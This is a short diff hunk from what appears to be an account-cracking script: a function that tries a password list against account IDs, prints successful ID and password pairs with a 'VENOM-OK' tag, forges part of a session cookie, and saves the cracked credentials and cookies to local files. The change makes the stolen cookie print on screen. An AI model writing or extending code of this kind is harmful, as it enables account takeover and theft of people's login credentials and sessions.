@@ -419,7 +419,7 @@ def rd1(ids,passlist):
                         ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                         cookie = f"sb={ssbb};{ckkk}"
                         print('\r\r\033[1;32m [VENOM-OK] '+uid+' √ '+pas)
-                        #print(' \33[1;33m[Cookies] == '+cookie)
+                        p(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
                         file_path_ok = os.path.join(folder_path, 'VENOM-R-OK.txt')
                         file_path_cookies = os.path.join(folder_path, 'VENOM-R-COOKIE.txt')
                         with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
